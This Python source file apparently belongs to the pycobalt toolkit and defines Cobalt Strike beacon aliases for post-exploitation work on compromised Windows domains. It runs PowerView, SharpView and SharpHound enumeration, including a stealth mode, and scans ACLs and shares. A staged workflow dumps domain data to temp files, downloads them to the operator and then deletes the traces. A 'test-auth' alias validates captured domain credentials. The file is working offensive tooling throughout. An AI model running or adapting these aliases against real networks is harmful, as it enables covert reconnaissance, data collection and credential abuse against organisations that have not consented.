#!/usr/bin/env python3

import sys
import utils
sys.path.insert(0, utils.basedir('pycobalt'))

import pycobalt.engine as engine
import pycobalt.events as events
import pycobalt.commands as commands
import pycobalt.aliases as aliases
import pycobalt.aggressor as aggressor
import pycobalt.callbacks as callbacks
import pycobalt.helpers as helpers
import pycobalt.sharpgen as sharpgen
from pycobalt.helpers import powershell_quote

import external

def import_network_recon(bid):
    """
    Import NetworkRecon.ps1
    """

    aggressor.bpowershell_import(bid, utils.basedir('powershell/NetworkRecon.ps1'))

def import_domain_recon(bid):
    """
    Import DomainRecon.ps1
    """

    aggressor.bpowershell_import(bid, utils.basedir('powershell/DomainRecon.ps1'))

@aliases.alias('network', 'Perform some basic network-related recon')
def _(bid):
    import_network_recon(bid)
    aggressor.bpowerpick(bid, 'Invoke-NetworkRecon')

# TODO test
@aliases.alias('rdns', 'Perform RDNS scan')
def _(bid, *ranges):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/PowerSploit/Recon/Invoke-ReverseDnsLookup.ps1'))

    command = ''
    for r in ranges:
        command += 'Invoke-ReverseDnsLookup {}\n'.format(r)

    aggressor.bpowerpick(bid, command)

@aliases.alias('netstat', 'Get active TCP connections and TCP/UDP listeners')
def _(bid):
    external.run(bid, 'seatbelt', ['AllTcpConnections', 'AllUdpConnections'])

@aliases.alias('wanip', 'Get WAN IP with ipecho.net')
def _(bid):
    aggressor.bpowerpick(bid, 'Write-Output "WANIP: $((New-Object System.Net.WebClient).DownloadString("https://ipecho.net/json"))"')

# TODO use pure powershell
@aliases.alias('wanip-dns', 'Get WAN IP with DNS')
def _(bid):
    aggressor.bshell(bid, 'nslookup myip.opendns.com. resolver1.opendns.com')

@aliases.alias('domain', 'Get basic domain info')
def _(bid):
    import_domain_recon(bid)
    aggressor.bpowerpick(bid, 'Invoke-DomainRecon')

@aliases.alias('domain-enum', 'Get full domain info')
def _(bid):
    temp = helpers.guess_temp(bid)

    # Forests and trusts:
    # Get-DomainTrustMapping
    # Get-ForestTrust
    # Get-DomainTrust

    # Parsing GPOs:
    # Get-GptTmpl
    # Get-GroupsXML

    # File shares:
    # Get-DomainFileServer
    # Get-DomainDFSShare

    # Get-DomainManagedSecurityGroup?

    # TODO remove subnet and site?
    # computer objects don't show up in Get-DomainObject for some reason
    command = helpers.code_string(r"""
        cd {}
        $FormatEnumerationLimit=-1
        Get-DomainObject | Format-List -Property * > objects.domain
        Get-DomainPolicyData | Format-List -Property * > policy.domain
        Get-DomainSite | Format-List -Property * > sites.domain
        Get-DomainSubnet | Format-List -Property * > subnets.domain
        Get-DomainGPOUserLocalGroupMapping | Format-List -Property * > gpo_localgroups.domain
        Get-GPODelegation | Format-List -Property * > gpo_delegations.domain
        Get-DomainGPO | %{{Get-ObjectACL -ResolveGUIDs -Name $_.Name}} > gpo_acls.domain
        Get-DomainTrustMapping | Format-List -Property * > trusts.domain
        Get-DomainManagedSecurityGroup | Format-List -Property * > managers.domain
        Invoke-ACLScanner -ResolveGUIDs > interesting_acls.domain
        echo "All finished with domain-enum. Run domain-enum-next."
        """.format(powershell_quote(temp)))

    aggressor.btask(bid, 'Tasked beacon to enumerate domain objects and info (stage 1/3)')
    external.run(bid, 'powerview', command)

@aliases.alias('domain-enum-next', 'Grab files from domain-enum')
def _(bid):
    temp = helpers.guess_temp(bid)

    aggressor.btask(bid, 'Tasked beacon to download files from domain-enum (stage 2/3). Once finished run domain-enum-next2')
    aggressor.bdownload(bid, r'{}\objects.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\policy.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\sites.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\subnets.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\gpo_localgroups.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\gpo_delegations.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\gpo_acls.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\trusts.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\managers.domain'.format(temp))
    aggressor.bdownload(bid, r'{}\interesting_acls.domain'.format(temp))

@aliases.alias('domain-enum-next2', 'Clean up files from domain-enum')
def _(bid):
    temp = helpers.guess_temp(bid)

    aggressor.btask(bid, 'Tasked beacon to clean up files from domain-enum (stage 3/3)')
    aggressor.brm(bid, r'{}\objects.domain'.format(temp))
    aggressor.brm(bid, r'{}\policy.domain'.format(temp))
    aggressor.brm(bid, r'{}\sites.domain'.format(temp))
    aggressor.brm(bid, r'{}\subnets.domain'.format(temp))
    aggressor.brm(bid, r'{}\gpo_localgroups.domain'.format(temp))
    aggressor.brm(bid, r'{}\gpo_delegations.domain'.format(temp))
    aggressor.brm(bid, r'{}\gpo_acls.domain'.format(temp))
    aggressor.brm(bid, r'{}\trusts.domain'.format(temp))
    aggressor.brm(bid, r'{}\managers.domain'.format(temp))
    aggressor.brm(bid, r'{}\interesting_acls.domain'.format(temp))

# TODO test
@aliases.alias('spns', 'Show SPNs')
def _(bid, out=None):
    aggressor.bpowershell_import(bid, utils.basedir('powershell/UserSPN.ps1'))

    command = 'Get-AccountSPNs'

    if out:
        # output to file
        command += ' > {}'.format(powershell_quote(out))

    aggressor.bpowerpick(bid, command)

@aliases.alias('import-powerview', "Import PowerView")
def _(bid):
    external.import_script(bid, 'powerview')

@aliases.alias('powerview', "Run a PowerView command")
def _(bid, *args):
    external.run(bid, 'powerview', args)

#@aliases.alias('userhunter', "Run SharpView's Find-DomainUserLocation on a list of computers")
#def _(bid, *args):
#    parser = helpers.ArgumentParser(prog='userhunter', bid=bid, description='Run Find-DomainUserLocation')
#    parser.add_argument('--computers-file', help='Run against computer names from file')
#    parser.add_argument('--users-file', help='Search for usernames from file')
#    parser.add_argument('args', nargs='*', help='Additional arguments to pass to SharpView')
#    try: args = parser.parse_args(args)
#    except: return
#
#    command = 'Find-DomainUserLocation'
#
#    # --computers-file
#    if args.computers_file:
#        with open(args.computers_file, 'r') as fp:
#            computers = [line.strip() for line in fp]
#
#        command += ' -ComputerName ' + ','.join(computers)
#
#    # --users-file
#    if args.users_file:
#        with open(args.users_file, 'r') as fp:
#            users = [line.strip() for line in fp]
#
#        command += ' -UserIdentity ' + ','.join(users)
#
#    # <args>
#    if args.args:
#        command += ' ' + ' '.join(args.args)
#
#    execute_sharpview(bid, command)

# TODO test
@aliases.alias('filefinder', "Run PowerView's FileFinder")
def _(bid, *args):
    external.run(bid, 'powerview', 'Invoke-FileFinder {}'.format(' '.join(args)))

# TODO test
@aliases.alias('sharefinder', "Find accessible shares using PowerView's ShareFinder")
def _(bid, *args):
    external.run(bid, 'powerview', 'Invoke-ShareFinder -CheckShareAccess {}'.format(' '.join(args)))

def run_sharpview(bid, command):
    """
    Run SharpView
    """

    sharpview = utils.basedir('tools/SharpView.exe')
    aggressor.bexecute_assembly(bid, sharpview, command)

@aliases.alias('sharpview', "Run SharpView")
def _(bid, command):
    run_sharpview(bid, command)

#@aliases.alias('kerberoast-sharpview', "Run Invoke-Kerberoast (using SharpView)")
#def _(bid):
#    run_sharpview(bid, 'Invoke-Kerberoast -OutputFormat Hashcat')

# TODO test
@aliases.alias('adminaccess', "Run PowerView's Find-LocalAdminAccess")
def _(bid, *args):
    external.run(bid, 'powerview', 'Find-LocalAdminAccess {}; echo "Finished with Find-LocalAdminAccess"'.format(' '.join(args)))

# TODO use Get-WmiObject
# $shares = Get-WmiObject -Class Win32_Share | Format-Table -Wrap | Out-String
@aliases.alias('shares', 'Show shares on a host')
def _(bid, *hosts):
    if not hosts:
        hosts = ['localhost']

    command = ''
    for host in hosts:
        if not host.startswith(r'\\'):
            host = r'\\{}'.format(host)

        command += 'net view /all {};\n'.format(host)

    aggressor.btask(bid, 'Tasked beacon to list shares on: {}'.format(', '.join(hosts)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('share-list', 'Run ls in each share on each host')
def _(bid, *hosts):
    if not hosts:
        hosts = ['localhost']

    command = ''
    for host in hosts:
        if not host.startswith(r'\\'):
            host = r'\\{}'.format(host)

        command += helpers.code_string(r"""
            (net view /all "{host}" | Where-Object {{ $_ -match '\sDisk\s' }}) -replace '\s\s+', ',' |
            ForEach-Object {{
                $drive = ($_ -split ',')[0]
                ls "{host}\$drive" 2>$null
            }};
            """.format(host=host))

    aggressor.btask(bid, 'Tasked beacon to list files on shares for hosts: {}'.format(', '.join(hosts)))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('sharphound', 'Run SharpHound, default args')
def _(bid, *args):
    external.run(bid, 'sharphound', list(args))

@aliases.alias('sharphound-stealth', 'Run SharpHound, stealth args')
def _(bid, *args):
    external.run(bid, 'sharphound', ['--Stealth'] + list(args))

@aliases.alias('sharphound-sessions', 'Run SharpHound, gather session info')
def _(bid, *args):
    external.run(bid, 'sharphound', ['--CollectionMethod', 'Sessions'] + list(args))

@aliases.alias('sharphound-all', 'Run SharpHound, gather all info (noisy)')
def _(bid, *args):
    external.run(bid, 'sharphound', ['--CollectionMethod', 'All'] + list(args))

# TODO microphone
#                bpowershell_import($1, script_resource("EnumKit/scripts/Get-MicrophoneAudio.ps1"));
#                blog($1, "Once imported, run \c8Get-Help Get-MicrophoneAudio -full\c0 for full usage instructions");

@aliases.alias('test-auth', 'Test domain credentials')
def _(bid, username, password):
    command = helpers.code_string(r"""
        if ((new-object directoryservices.directoryentry "", "{username}", "{password}").psbase.name -ne $null) {{
            Write-Host "Credentials {username}:{password} are valid :)"
        }} else {{
            Write-Host "Credentials {username}:{password} are not valid :("
        }}
        """.format(username=username, password=password))

    aggressor.btask(bid, 'Tasked beacon to test credentials {}:{}'.format(username, password))
    aggressor.bpowerpick(bid, command, silent=True)

@aliases.alias('grouper', 'Run Grouper2')
def _(bid, *args):
    external.run(bid, 'grouper', list(args))
